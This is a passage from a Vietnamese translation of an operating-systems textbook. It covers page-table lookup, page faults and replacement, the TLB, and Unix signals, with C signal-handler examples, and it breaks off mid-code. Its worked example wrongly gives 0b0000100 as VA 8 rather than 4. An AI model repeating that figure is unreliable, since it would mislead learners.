<p>Tối thiểu, hầu hết các kiến trúc đều cung cấp <strong>page table base register</strong> (<strong>PTBR</strong>) lưu <strong>địa chỉ gốc</strong> của page table của process đang chạy.<br />
Để dịch từ VA sang PA, phần <strong>virtual page number</strong> của VA sẽ được kết hợp với giá trị trong PTBR để tìm PTE của virtual page đó.</p>
<p>Nói cách khác:</p>
<ul>
<li>Virtual page number là <strong>chỉ số</strong> trong page table của process.</li>
<li>Giá trị này kết hợp với PTBR sẽ cho ra <strong>địa chỉ RAM</strong> của PTE cho page <em>p</em><br />
(ví dụ: <code>PTBR + p × (kích thước PTE)</code> là địa chỉ RAM của PTE cho page <em>p</em>).</li>
</ul>
<p>Một số kiến trúc có thể hỗ trợ <strong>tra cứu toàn bộ page table</strong> bằng cách xử lý các bit PTE trong phần cứng.<br />
Nếu không, OS sẽ phải được <strong>ngắt</strong> để xử lý một số phần của quá trình tra cứu page table và truy cập các bit PTE để dịch VA sang PA.</p>
<p>Khi <strong>context switch</strong>, OS sẽ <strong>lưu và khôi phục</strong> giá trị PTBR của các process để đảm bảo rằng khi một process chạy trên CPU, nó sẽ truy cập ánh xạ VA–PA của riêng nó từ page table của chính nó trong RAM.</p>
<p>Đây là một cơ chế giúp OS bảo vệ <strong>virtual address space</strong> của các process khỏi nhau:</p>
<ul>
<li>Việc thay đổi giá trị PTBR khi context switch đảm bảo một process <strong>không thể</strong> truy cập ánh xạ VA–PA của process khác.</li>
<li>Nhờ đó, nó không thể đọc hoặc ghi dữ liệu tại các physical address đang lưu nội dung không gian địa chỉ ảo của bất kỳ process nào khác.</li>
</ul>
<h4 id="ví-dụ-Ánh-xạ-vapa-của-hai-process"><a class="header" href="#ví-dụ-Ánh-xạ-vapa-của-hai-process">Ví dụ: Ánh xạ VA–PA của hai process</a></h4>
<p>Ví dụ, xét một hệ thống với:</p>
<ul>
<li>Kích thước page: <strong>8 byte</strong></li>
<li>Virtual address: <strong>7 bit</strong></li>
<li>Physical address: <strong>6 bit</strong></li>
</ul>
<div class="table-wrapper"><table><thead><tr><th><strong>Bảng trang của P1</strong></th><th></th><th></th><th></th><th><strong>Bảng trang của P2</strong></th><th></th><th></th></tr></thead><tbody>
<tr><td><strong>Entry</strong></td><td>Valid</td><td>Frame #</td><td></td><td><strong>Entry</strong></td><td>Valid</td><td>Frame #</td></tr>
<tr><td>0</td><td>1</td><td>3</td><td></td><td>0</td><td>1</td><td>1</td></tr>
<tr><td>1</td><td>1</td><td>2</td><td></td><td>1</td><td>1</td><td>4</td></tr>
<tr><td>2</td><td>1</td><td>6</td><td></td><td>2</td><td>1</td><td>5</td></tr>
<tr><td>...</td><td>...</td><td>...</td><td></td><td>...</td><td>...</td><td>...</td></tr>
<tr><td>11</td><td>1</td><td>7</td><td></td><td>11</td><td>0</td><td>3</td></tr>
<tr><td>...</td><td>...</td><td>...</td><td></td><td>...</td><td>...</td><td>...</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Ví dụ bảng trang của các process</p>
<p>Với trạng thái hiện tại (chỉ hiển thị một phần) của bảng trang của hai process (P1 và P2) trong <strong>Bảng 2</strong>,<br />
hãy tính <strong>physical address</strong> cho chuỗi <strong>virtual memory address</strong> sau được CPU tạo ra<br />
(mỗi địa chỉ được ghi kèm tiền tố là process đang chạy trên CPU):</p>
<pre><code>P1: 0000100
P1: 0000000
P1: 0010000
              &lt;---- context switch
P2: 0010000
P2: 0001010
P2: 1011001
              &lt;---- context switch
P1: 1011001
</code></pre>
<p><strong>Bước 1:</strong> Xác định cách chia bit trong virtual address và physical address.<br />
Vì kích thước page là 8 byte, <strong>3 bit thấp</strong> của mỗi địa chỉ code hóa <strong>page offset</strong> (<em>d</em>).<br />
Virtual address dài 7 bit → 3 bit thấp cho page offset, còn lại <strong>4 bit cao</strong> để xác định <strong>page number</strong> (<em>p</em>).<br />
Physical address dài 6 bit → 3 bit thấp cho page offset, <strong>3 bit cao</strong> xác định <strong>frame number</strong>.</p>
<p><strong>Bước 2:</strong> Với mỗi virtual address, dùng các bit page number (<em>p</em>) để tra trong page table của process tương ứng, lấy <strong>PTE</strong> cho page <em>p</em>.<br />
Nếu <strong>valid bit</strong> trong PTE = 1 → dùng <strong>frame number</strong> (<em>f</em>) làm các bit cao của PA.<br />
Các bit thấp của PA lấy từ byte offset (<em>d</em>) của VA.</p>
<p>Kết quả được thể hiện trong <strong>Bảng 3</strong> (lưu ý bảng trang nào được dùng để dịch địa chỉ ở mỗi bước):</p>
<div class="table-wrapper"><table><thead><tr><th>Process</th><th>VirtAddr</th><th>p</th><th>d</th><th>PTE</th><th>f</th><th>d</th><th>PhysAddr</th></tr></thead><tbody>
<tr><td>P1</td><td>0000100</td><td>0000</td><td>100</td><td>PT[0]: 1(v),3(f)</td><td>011</td><td>100</td><td>011100</td></tr>
<tr><td>P1</td><td>0000000</td><td>0000</td><td>000</td><td>PT[0]: 1(v),3(f)</td><td>011</td><td>000</td><td>011000</td></tr>
<tr><td>P1</td><td>0010000</td><td>0010</td><td>000</td><td>PT[2]: 1(v),6(f)</td><td>110</td><td>000</td><td>110000</td></tr>
<tr><td><strong>Context Switch P1 → P2</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
<tr><td>P2</td><td>0010000</td><td>0010</td><td>000</td><td>PT[2]: 1(v),5(f)</td><td>101</td><td>000</td><td>101000</td></tr>
<tr><td>P2</td><td>0001010</td><td>0001</td><td>010</td><td>PT[1]: 1(v),4(f)</td><td>100</td><td>010</td><td>100010</td></tr>
<tr><td>P2</td><td>1011001</td><td>1011</td><td>001</td><td>PT[11]: 0(v),3(f)</td><td><strong>page fault (valid bit 0)</strong></td><td></td><td></td></tr>
<tr><td><strong>Context Switch P2 → P1</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
<tr><td>P1</td><td>1011001</td><td>1011</td><td>001</td><td>PT[11]: 1(v),7(f)</td><td>111</td><td>001</td><td>111001</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Ánh xạ địa chỉ cho chuỗi truy cập bộ nhớ ví dụ từ P1 và P2.<br />
Lưu ý rằng <strong>context switch</strong> sẽ thay đổi bảng trang được dùng để dịch địa chỉ.</p>
<p><strong>Ví dụ giải thích:</strong><br />
Xét lần truy cập địa chỉ đầu tiên của P1:</p>
<ul>
<li>P1 truy cập VA = 8 (<code>0b0000100</code>).</li>
<li>Chia địa chỉ: <strong>page number</strong> = 0 (<code>0b0000</code>), <strong>byte offset</strong> = 4 (<code>0b100</code>).</li>
<li>Page number 0 → tra PTE entry 0: <code>valid bit = 1</code> (ánh xạ hợp lệ), <code>frame number = 3</code> (<code>0b011</code>).</li>
<li>PA được tạo: bit cao = <code>0b011</code> (frame number), bit thấp = <code>0b100</code> (offset) → PA = <code>0b011100</code>.</li>
</ul>
<p>Khi P2 được <strong>context switch</strong> lên CPU, bảng trang của P2 sẽ được dùng.<br />
Lưu ý rằng khi P1 và P2 truy cập cùng một VA <code>0b0010000</code>, chúng nhận được <strong>physical address khác nhau</strong>.<br />
Nếu P2 truy cập một PTE có valid bit = 0, sẽ xảy ra <strong>page fault</strong>, yêu cầu OS xử lý.</p>
<p>(TODO)</p>
<h3 id="1334-hiệu-quả-sử-dụng-bộ-nhớ-memory-efficiency"><a class="header" href="#1334-hiệu-quả-sử-dụng-bộ-nhớ-memory-efficiency">13.3.4. Hiệu quả sử dụng bộ nhớ (Memory Efficiency)</a></h3>
<p>Một trong những mục tiêu chính của <strong>operating system</strong> (OS – hệ điều hành) là quản lý hiệu quả các tài nguyên phần cứng.<br />
Hiệu năng của hệ thống phụ thuộc đặc biệt vào cách OS quản lý <strong>memory hierarchy</strong> (hệ thống phân cấp bộ nhớ).<br />
Ví dụ: nếu một <strong>process</strong> truy cập dữ liệu được lưu trong RAM, nó sẽ chạy nhanh hơn nhiều so với khi dữ liệu đó nằm trên đĩa.</p>
<p>OS luôn cố gắng tăng <strong>mức độ multiprogramming</strong> (đa chương trình) trong hệ thống để giữ cho CPU bận rộn thực hiện công việc thực sự, ngay cả khi một số process đang bị <strong>blocked</strong> (chặn) chờ một sự kiện như <strong>disk I/O</strong>.<br />
Tuy nhiên, vì RAM là bộ nhớ có dung lượng cố định, OS phải quyết định process nào sẽ được nạp vào RAM tại mỗi thời điểm, điều này có thể giới hạn mức độ multiprogramming của hệ thống.</p>
<p>Ngay cả những hệ thống có lượng RAM lớn (hàng chục hoặc hàng trăm gigabyte) cũng thường không thể đồng thời lưu trữ toàn bộ <strong>address space</strong> (không gian địa chỉ) của tất cả các process trong hệ thống.<br />
Do đó, OS có thể sử dụng tài nguyên hiệu quả hơn bằng cách chỉ chạy các process với <strong>một phần</strong> không gian địa chỉ ảo của chúng được nạp vào RAM.</p>
<h4 id="triển-khai-virtual-memory-bằng-ram-đĩa-và-thay-thế-trang-page-replacement"><a class="header" href="#triển-khai-virtual-memory-bằng-ram-đĩa-và-thay-thế-trang-page-replacement">Triển khai Virtual Memory bằng RAM, đĩa và thay thế trang (Page Replacement)</a></h4>
<p>Như đã đề cập trong <a href="C13-OS/../C11-MemHierarchy/mem_hierarchy.html#_locality">Chương Memory Hierarchy</a>,<br />
các truy cập bộ nhớ thường thể hiện <strong>tính cục bộ</strong> (locality) rất cao.<br />
Trong ngữ cảnh <strong>paging</strong>, điều này có nghĩa là các process có xu hướng truy cập các <strong>page</strong> trong không gian bộ nhớ của chúng với mức độ <strong>temporal locality</strong> (cục bộ theo thời gian) hoặc <strong>spatial locality</strong> (cục bộ theo không gian) cao.<br />
Nó cũng có nghĩa là tại bất kỳ thời điểm nào trong quá trình thực thi, một process thường <strong>không</strong> truy cập một phạm vi lớn trong không gian địa chỉ của nó.<br />
Trên thực tế, các process thường <strong>không bao giờ</strong> sử dụng hết toàn bộ không gian stack hoặc heap của mình.</p>
<p>Một cách để OS sử dụng hiệu quả cả RAM và CPU là <strong>coi RAM như một bộ nhớ đệm (cache) cho đĩa</strong>.<br />
Bằng cách này, OS cho phép các process chạy trong hệ thống chỉ với <strong>một số</strong> page bộ nhớ ảo của chúng được nạp vào các <strong>physical frame</strong> của RAM.<br />
Các page bộ nhớ ảo khác vẫn nằm trên <strong>secondary storage</strong> (bộ nhớ phụ) như đĩa, và OS chỉ nạp chúng vào RAM khi process truy cập tới địa chỉ thuộc các page đó.</p>
<p>Đây là một phần khác của abstraction <strong>virtual memory</strong> — OS triển khai một góc nhìn về một “bộ nhớ vật lý” lớn duy nhất, được xây dựng từ RAM kết hợp với đĩa hoặc các thiết bị lưu trữ phụ khác.<br />
Lập trình viên <strong>không cần</strong> quản lý thủ công bộ nhớ của chương trình, cũng như không cần xử lý việc di chuyển dữ liệu vào/ra RAM khi chương trình cần.</p>
<p>Bằng cách coi RAM như cache cho đĩa, OS chỉ giữ trong RAM <strong>những page</strong> từ không gian địa chỉ ảo của các process <strong>đang được truy cập</strong> hoặc <strong>vừa được truy cập gần đây</strong>.<br />
Kết quả là:</p>
<ul>
<li>Các page được truy cập thường xuyên sẽ nằm trong RAM nhanh.</li>
<li>Các page ít hoặc không được truy cập sẽ nằm trên đĩa chậm hơn.</li>
</ul>
<p>Điều này giúp sử dụng RAM hiệu quả hơn vì OS chỉ dùng RAM để lưu các page thực sự được dùng, tránh lãng phí dung lượng RAM cho các page sẽ không được truy cập trong thời gian dài hoặc không bao giờ.</p>
<p>Nó cũng giúp CPU hoạt động hiệu quả hơn bằng cách cho phép nhiều process cùng chia sẻ RAM để lưu các page đang hoạt động, từ đó tăng số lượng process ở trạng thái <strong>ready</strong> trong hệ thống, giảm thời gian CPU rảnh do tất cả process đều đang chờ sự kiện như disk I/O.</p>
<p>Tuy nhiên, trong hệ thống virtual memory, đôi khi process cố gắng truy cập một page <strong>chưa được lưu trong RAM</strong> (gây ra <strong>page fault</strong>).<br />
Khi xảy ra page fault, OS cần đọc page đó từ đĩa vào RAM trước khi process có thể tiếp tục thực thi.</p>
<p><strong>MMU</strong> sẽ đọc <strong>valid bit</strong> của <strong>PTE</strong> để xác định có cần kích hoạt <strong>page fault exception</strong> hay không.<br />
Khi gặp một PTE có valid bit = 0, MMU sẽ <strong>trap</strong> (ngắt) về OS, và OS sẽ thực hiện các bước sau:</p>
<ol>
<li><strong>Tìm một frame trống</strong> (ví dụ: frame <em>j</em>) trong RAM để nạp page bị lỗi vào.</li>
<li><strong>Đọc từ đĩa</strong> để nạp page vào frame <em>j</em> của RAM.</li>
<li>Khi việc đọc từ đĩa hoàn tất, <strong>cập nhật PTE</strong>: đặt frame number = <em>j</em> và valid bit = 1 (PTE của page bị lỗi giờ đã có ánh xạ hợp lệ tới frame <em>j</em>).</li>
<li><strong>Khởi động lại process</strong> tại lệnh đã gây ra page fault.<br />
Lúc này, page table đã có ánh xạ hợp lệ cho page bị lỗi, process có thể truy cập địa chỉ bộ nhớ ảo ánh xạ tới offset trong physical frame <em>j</em>.</li>
</ol>
<p>Để xử lý <strong>page fault</strong>, OS cần theo dõi những <strong>RAM frame</strong> nào đang trống để có thể tìm một frame trống và nạp page được đọc từ đĩa vào đó.<br />
Hệ điều hành thường duy trì một <strong>danh sách các frame trống</strong> sẵn sàng để cấp phát khi xảy ra page fault.</p>
<p>Nếu không còn frame RAM trống, OS sẽ chọn một frame đang được sử dụng và <strong>thay thế</strong> page trong đó bằng page bị lỗi.<br />
<strong>PTE</strong> (Page Table Entry) của page bị thay thế sẽ được cập nhật, đặt <strong>valid bit</strong> của nó về 0 (ánh xạ PTE của page này không còn hợp lệ).</p>
<p>Page bị thay thế sẽ được ghi trở lại đĩa nếu nội dung của nó trong RAM <strong>khác</strong> với bản trên đĩa;<br />
nếu process sở hữu page đã ghi dữ liệu vào page khi nó đang nằm trong RAM, thì bản RAM của page cần được ghi ra đĩa trước khi bị thay thế để tránh mất các thay đổi trong page của bộ nhớ ảo.</p>
<p>PTE thường bao gồm một <strong>dirty bit</strong> để cho biết bản sao trong RAM của page đã bị sửa đổi (ghi dữ liệu) hay chưa.<br />
Trong quá trình thay thế trang, nếu dirty bit của page bị thay thế được đặt, page đó cần được ghi ra đĩa trước khi thay bằng page bị lỗi.<br />
Nếu dirty bit = 0, bản trên đĩa của page bị thay thế giống với bản trong RAM, và page không cần ghi ra đĩa khi bị thay thế.</p>
<p>Trong phần thảo luận về <strong>virtual memory</strong>, chúng ta chủ yếu tập trung vào phần <strong>mechanism</strong> (cơ chế) của việc triển khai bộ nhớ ảo phân trang.<br />
Tuy nhiên, còn một phần quan trọng khác là <strong>policy</strong> (chính sách) trong việc triển khai paging của OS.</p>
<p>Khi RAM trống trong hệ thống đã hết, OS cần thực thi <strong>page replacement policy</strong> (chính sách thay thế trang).<br />
Chính sách này sẽ chọn một frame RAM đang được sử dụng và thay nội dung của nó bằng page bị lỗi; page hiện tại sẽ bị <strong>evict</strong> (loại bỏ) khỏi RAM để nhường chỗ cho page bị lỗi.</p>
<p>OS cần triển khai một chính sách thay thế trang tốt để chọn frame nào trong RAM sẽ được ghi ra đĩa nhằm nhường chỗ cho page bị lỗi.<br />
Ví dụ: OS có thể triển khai chính sách <strong>least recently used</strong> (LRU – ít được sử dụng gần đây nhất), thay thế page trong frame RAM mà đã lâu không được truy cập nhất.<br />
LRU hoạt động tốt khi các truy cập bộ nhớ có tính cục bộ cao.<br />
Ngoài ra còn nhiều chính sách khác mà OS có thể lựa chọn để triển khai.<br />
Xem thêm trong giáo trình hệ điều hành để biết chi tiết về các chính sách thay thế trang.</p>
<h4 id="tăng-tốc-độ-truy-cập-trang-making-page-accesses-faster"><a class="header" href="#tăng-tốc-độ-truy-cập-trang-making-page-accesses-faster">Tăng tốc độ truy cập trang (Making Page Accesses Faster)</a></h4>
<p>Mặc dù <strong>paging</strong> có nhiều lợi ích, nó cũng gây ra sự <strong>chậm lại đáng kể</strong> cho mỗi lần truy cập bộ nhớ.<br />
Trong hệ thống bộ nhớ ảo phân trang, mỗi lệnh <strong>load</strong> hoặc <strong>store</strong> tới một địa chỉ bộ nhớ ảo cần <strong>hai</strong> lần truy cập RAM:</p>
<ol>
<li>Lần đầu đọc <strong>PTE</strong> để lấy frame number phục vụ dịch địa chỉ từ ảo sang vật lý.</li>
<li>Lần thứ hai đọc hoặc ghi byte tại địa chỉ RAM vật lý.</li>
</ol>
<p>Do đó, trong hệ thống bộ nhớ ảo phân trang, mỗi lần truy cập bộ nhớ sẽ chậm gấp đôi so với hệ thống hỗ trợ truy cập trực tiếp vào RAM vật lý.</p>
<p>Một cách để giảm chi phí phụ trội của paging là <strong>cache</strong> (lưu tạm) ánh xạ từ virtual page number sang physical frame number.<br />
Khi dịch một virtual address, <strong>MMU</strong> sẽ kiểm tra page number trong cache trước.<br />
Nếu tìm thấy, ánh xạ frame number của page có thể được lấy trực tiếp từ cache entry, tránh được một lần truy cập RAM để đọc PTE.</p>
<p><strong>Translation Look-aside Buffer</strong> (<strong>TLB</strong>) là một <strong>hardware cache</strong> (bộ nhớ đệm phần cứng) lưu trữ các ánh xạ (page number, frame number).<br />
Đây là một cache nhỏ, <strong>fully associative</strong> (liên kết đầy đủ), được tối ưu hóa cho việc tra cứu nhanh trong phần cứng.</p>
<ul>
<li>Khi MMU tìm thấy ánh xạ trong TLB (<strong>TLB hit</strong>), không cần tra cứu page table để dịch địa chỉ ảo sang địa chỉ vật lý, và chỉ cần <strong>một</strong> lần truy cập RAM để thực hiện load hoặc store.</li>
<li>Khi không tìm thấy ánh xạ trong TLB (<strong>TLB miss</strong>), cần thêm một lần truy cập RAM để đọc PTE của page, từ đó tạo địa chỉ vật lý cho thao tác load hoặc store.<br />
Ánh xạ liên quan đến TLB miss sẽ được thêm vào TLB.</li>
</ul>
<p>Với tính cục bộ cao trong các truy cập bộ nhớ, <strong>tỉ lệ hit</strong> trong TLB thường rất cao, giúp truy cập bộ nhớ trong hệ thống bộ nhớ ảo phân trang nhanh hơn nhiều — hầu hết các truy cập bộ nhớ ảo chỉ cần <strong>một</strong> lần truy cập RAM.</p>
<p><img src="C13-OS/_images/tlb.png" alt="TLB lookup for virtual page to physical frame mapping" /></p>
<p><strong>Hình 11.</strong> <strong>Translation Look-aside Buffer</strong> (TLB) là một cache phần cứng nhỏ lưu trữ ánh xạ từ virtual page sang physical frame.<br />
TLB được tìm kiếm trước cho entry của page <em>p</em>. Nếu tìm thấy, không cần tra cứu page table để dịch địa chỉ ảo sang địa chỉ vật lý.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="134-interprocess-communication"><a class="header" href="#134-interprocess-communication">13.4. Interprocess Communication</a></h2>
<p>Processes are one of the primary abstractions implemented by the OS.
Private virtual address spaces are an important abstraction in
multiprogrammed systems, and are one way in which the OS prevents
processes from interfering with one another's execution state. However,
sometimes a user or programmer may want their application processes to
communicate with one another (or to share some of their execution state)
as they run.</p>
<p>Operating systems typically implement support for several types of
interprocess communication, or ways in which processes can communicate
or share their execution state. <strong>Signals</strong> are a very restricted form
of interprocess communication by which one process can send a signal to
another process to notify it of some event. Processes can also
communicate using <strong>message passing</strong>, in which the OS implements an
abstraction of a message communication channel that is used by a process
to exchange messages with another process. Finally, the OS may support
interprocess communication through <strong>shared memory</strong> that allows a
process to share all or part of its virtual address space with other
processes. Processes with shared memory can read or write to addresses
in shared space to communicate with one another.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="1341-tín-hiệu-signals"><a class="header" href="#1341-tín-hiệu-signals">13.4.1. Tín hiệu (Signals)</a></h3>
<p><strong>Signal</strong> là một <strong>software interrupt</strong> (ngắt phần mềm) được gửi từ một <strong>process</strong> (tiến trình) này tới một process khác thông qua <strong>OS</strong> (hệ điều hành).<br />
Khi một process nhận được signal, điểm thực thi hiện tại của nó sẽ bị OS ngắt để chạy <strong>signal handler</strong> (code xử lý tín hiệu).<br />
Nếu signal handler trả về, quá trình thực thi của process sẽ tiếp tục từ vị trí mà nó bị ngắt để xử lý signal.<br />
Trong một số trường hợp, signal handler sẽ khiến process thoát (exit), và khi đó nó sẽ không tiếp tục thực thi từ vị trí trước khi bị ngắt.</p>
<p>Signal tương tự như <strong>hardware interrupt</strong> (ngắt phần cứng) và <strong>trap</strong>, nhưng khác ở một số điểm.<br />
Trong khi trap là một <strong>synchronous software interrupt</strong> (ngắt phần mềm đồng bộ) xảy ra khi một process gọi trực tiếp một <strong>system call</strong>, thì signal là <strong>asynchronous</strong> (bất đồng bộ) — một process có thể bị ngắt bởi việc nhận signal tại bất kỳ thời điểm nào trong quá trình thực thi.<br />
Signal cũng khác với asynchronous hardware interrupt ở chỗ chúng được kích hoạt bởi phần mềm chứ không phải thiết bị phần cứng.</p>
<p>Một process có thể gửi signal tới process khác bằng cách thực hiện system call <code>kill</code>, yêu cầu OS gửi (post) một signal tới process kia.<br />
OS sẽ xử lý việc gửi signal tới process đích và thiết lập trạng thái thực thi của nó để chạy signal handler tương ứng với signal được gửi.</p>
<blockquote>
<p>Tên của system call <code>kill</code> có thể gây hiểu nhầm và nghe có phần “bạo lực”.<br />
Mặc dù nó có thể (và thường) được dùng để gửi signal kết thúc (termination signal), nhưng nó cũng được dùng để gửi <strong>bất kỳ loại signal nào khác</strong> tới một process.</p>
</blockquote>
<p>OS cũng tự sử dụng signal để thông báo cho process về một số sự kiện nhất định.<br />
Ví dụ: OS sẽ gửi signal <code>SIGCHLD</code> tới một process khi một trong các <strong>child process</strong> (tiến trình con) của nó kết thúc.</p>
<p>Mỗi hệ thống định nghĩa một số lượng signal cố định (ví dụ: Linux định nghĩa 32 loại signal khác nhau).<br />
Do đó, signal cung cấp một cách thức giao tiếp hạn chế giữa các process, so với các phương pháp <strong>interprocess communication</strong> (IPC) khác như <strong>message passing</strong> hoặc <strong>shared memory</strong>.</p>
<p><strong>Bảng 1</strong> liệt kê một số signal đã được định nghĩa.<br />
Xem thêm trong <strong>man page</strong> (<code>man 7 signal</code>) để biết thêm ví dụ.</p>
<div class="table-wrapper"><table><thead><tr><th>Signal Name</th><th>Mô tả</th></tr></thead><tbody>
<tr><td><code>SIGSEGV</code></td><td>Lỗi phân đoạn (ví dụ: dereference một con trỏ null)</td></tr>
<tr><td><code>SIGINT</code></td><td>Ngắt process (ví dụ: nhấn Ctrl-C trong cửa sổ terminal để dừng process)</td></tr>
<tr><td><code>SIGCHLD</code></td><td>Child process đã kết thúc (ví dụ: một child trở thành zombie sau khi chạy <code>exit</code>)</td></tr>
<tr><td><code>SIGALRM</code></td><td>Thông báo cho process khi bộ đếm thời gian hết (ví dụ: <code>alarm(2)</code> mỗi 2 giây)</td></tr>
<tr><td><code>SIGKILL</code></td><td>Kết thúc process (ví dụ: <code>pkill -9 a.out</code>)</td></tr>
<tr><td><code>SIGBUS</code></td><td>Lỗi bus (ví dụ: truy cập một địa chỉ bộ nhớ không căn chỉnh để đọc giá trị <code>int</code>)</td></tr>
<tr><td><code>SIGSTOP</code></td><td>Tạm dừng process, chuyển sang trạng thái <strong>Blocked</strong> (ví dụ: Ctrl-Z)</td></tr>
<tr><td><code>SIGCONT</code></td><td>Tiếp tục một process bị chặn (chuyển sang trạng thái <strong>Ready</strong>; ví dụ: <code>bg</code> hoặc <code>fg</code>)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Ví dụ về các signal dùng cho giao tiếp liên tiến trình.</p>
<p>Khi một process nhận được signal, một trong số các hành động mặc định sau có thể xảy ra:</p>
<ul>
<li>Process có thể bị kết thúc (<strong>terminate</strong>).</li>
<li>Signal có thể bị bỏ qua (<strong>ignore</strong>).</li>
<li>Process có thể bị chặn (<strong>blocked</strong>).</li>
<li>Process có thể được bỏ chặn (<strong>unblocked</strong>).</li>
</ul>
<p>OS định nghĩa một <strong>hành động mặc định</strong> và cung cấp code <strong>default signal handler</strong> (trình xử lý tín hiệu mặc định) cho mỗi số hiệu signal.<br />
Tuy nhiên, lập trình viên ứng dụng có thể thay đổi hành động mặc định của hầu hết các signal và có thể viết code signal handler của riêng mình.<br />
Nếu một chương trình ứng dụng không đăng ký hàm signal handler riêng cho một signal cụ thể, thì handler mặc định của OS sẽ được thực thi khi process nhận signal đó.</p>
<p>Với một số signal, hành động mặc định do OS định nghĩa <strong>không thể</strong> bị ghi đè bởi code signal handler của ứng dụng.<br />
Ví dụ: nếu một process nhận signal <code>SIGKILL</code>, OS <strong>luôn</strong> buộc process phải thoát; và khi nhận signal <code>SIGSTOP</code>, process sẽ <strong>luôn</strong> bị chặn cho đến khi nhận signal để tiếp tục (<code>SIGCONT</code>) hoặc để thoát (<code>SIGKILL</code>).</p>
<p>Linux hỗ trợ hai system call khác nhau có thể được dùng để thay đổi hành vi mặc định của một signal hoặc để đăng ký signal handler cho một signal cụ thể: <code>sigaction</code> và <code>signal</code>.<br />
Vì <code>sigaction</code> tuân thủ chuẩn POSIX và có nhiều tính năng hơn, nó nên được dùng trong phần mềm triển khai thực tế.<br />
Tuy nhiên, trong ví dụ code của chúng ta, ta dùng <code>signal</code> vì nó dễ hiểu hơn.</p>
<p>Dưới đây là <a href="C13-OS/_attachments/signals.c">chương trình ví dụ</a> đăng ký signal handler cho các signal <code>SIGALRM</code>, <code>SIGINT</code> và <code>SIGCONT</code> bằng system call <code>signal</code> (đã bỏ phần xử lý lỗi để dễ đọc):</p>
<h4 id="ví-dụ-đăng-ký-signal-handler"><a class="header" href="#ví-dụ-đăng-ký-signal-handler">Ví dụ đăng ký signal handler</a></h4>
<pre><code class="language-c">/*
 * Example of signal handlers for SIGALRM, SIGINT, and SIGCONT
 *
 * A signal handler function prototype must match:
 *   void handler_function_name(int signum);
 *
 * Compile and run this program, then send this process signals by executing:
 *  kill -INT  pid  (or Ctrl-C) will send a SIGINT
 *  kill -CONT pid  (or Ctrl-Z fg) will send a SIGCONT
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;signal.h&gt;

/* signal handler for SIGALRM */
void sigalarm_handler(int sig) {
    printf(&quot;BEEP, signal number %d\n.&quot;, sig);
    fflush(stdout);
    alarm(5);  /* sends another SIGALRM in 5 seconds */
}

/* signal handler for SIGCONT */
void sigcont_handler(int sig) {
    printf(&quot;in sigcont handler function, signal number %d\n.&quot;, sig);
    fflush(stdout);
}

/* signal handler for SIGINT */
void sigint_handler(int sig) {
    printf(&quot;in sigint handler function, signal number %d...exiting\n.&quot;, sig);
    fflush(stdout);
    exit(0);
}

/* main: register signal handlers and repeatedly block until receive signal */
int main(void) {

    /* Register signal handlers. */
    if (signal(SIGCONT, sigcont_handler) == SIG_ERR) {
        printf(&quot;Error call to signal, SIGCONT\n&quot;);
        exit(1);
    }

    if (signal(SIGINT, sigint_handler) == SIG_ERR) {
        printf(&quot;Error call to signal, SIGINT\n&quot;);
        exit(1);
    }

    if (signal(SIGALRM, sigalarm_handler) == SIG_ERR) {
        printf(&quot;Error call to signal, SIGALRM\n&quot;);
        exit(1);
    }

    printf(&quot;kill -CONT %d to send SIGCONT\n&quot;, getpid());

    alarm(5);  /* sends a SIGALRM in 5 seconds */

    while(1) {
        pause(); /* wait for a signal to happen */
    }
}
</code></pre>
<p>Khi chạy, process sẽ nhận <code>SIGALRM</code> mỗi 5 giây (do lời gọi <code>alarm</code> trong <code>main</code> và <code>sigalarm_handler</code>).<br />
Các signal <code>SIGINT</code> và <code>SIGCONT</code> có thể được kích hoạt bằng cách chạy lệnh <code>kill</code> hoặc <code>pkill</code> trong một shell khác.<br />
Ví dụ: nếu PID của process là 1234 và file thực thi là <code>a.out</code>, thì các lệnh sau sẽ gửi signal <code>SIGINT</code> và <code>SIGCONT</code> tới process, kích hoạt các hàm signal handler tương ứng:</p>
<pre><code class="language-bash">pkill -INT a.out
kill  -INT 1234

pkill -CONT a.out
kill  -CONT 1234
</code></pre>
<h4 id="viết-signal-handler-cho-sigchld"><a class="header" href="#viết-signal-handler-cho-sigchld">Viết signal handler cho SIGCHLD</a></h4>
<p>Hãy nhớ rằng khi một process kết thúc, OS sẽ gửi signal <code>SIGCHLD</code> tới <strong>parent process</strong> của nó.<br />
Trong các chương trình tạo ra <strong>child process</strong>, parent process không phải lúc nào cũng muốn bị chặn bởi lời gọi <code>wait</code> cho đến khi tất cả child process kết thúc.</p>
<p>Ví dụ: khi một chương trình shell chạy một lệnh ở chế độ nền, nó vẫn tiếp tục chạy song song với child process, xử lý các lệnh shell khác ở chế độ nền trong khi child process chạy ở chế độ nền.<br />
Tuy nhiên, parent process cần gọi <code>wait</code> để <strong>reap</strong> (thu hồi) các <strong>zombie process</strong> sau khi chúng kết thúc.<br />
Nếu không, các zombie process sẽ không bao giờ biến mất và tiếp tục chiếm giữ một số tài nguyên hệ thống.</p>
<p>Trong những trường hợp này, parent process có thể đăng ký signal handler cho signal <code>SIGCHLD</code>.<br />
Khi parent nhận <code>SIGCHLD</code> từ một child process đã kết thúc, code handler của nó sẽ chạy và gọi <code>wait</code> để thu hồi các zombie process.</p>
<p>Dưới đây là đoạn code minh họa việc triển khai hàm signal handler cho signal <code>SIGCHLD</code>.<br />
Đoạn code này cũng cho thấy một phần của hàm <code>main</code> đăng ký signal handler cho <code>SIGCHLD</code> (lưu ý: việc này nên được thực hiện <strong>trước</strong> bất kỳ lời gọi <code>fork</code> nào):</p>
<h4 id="ví-dụ-signal-handler-cho-sigchld"><a class="header" href="#ví-dụ-signal-handler-cho-sigchld">Ví dụ signal handler cho SIGCHLD</a></h4>
<pre><code class="language-c">/*
 * signal handler for SIGCHLD: reaps zombie children
 *  signum: the number of the signal (will be 20 for SIGCHLD)
 */
void sigchld_handler(int signum) {
    int status;
    pid_t pid;

    /*
     * reap any and all exited child processes
     * (loop because there could be more than one)
     */
    while( (pid = waitpid(-1, &amp;status, WNOHANG)) &gt; 0) {
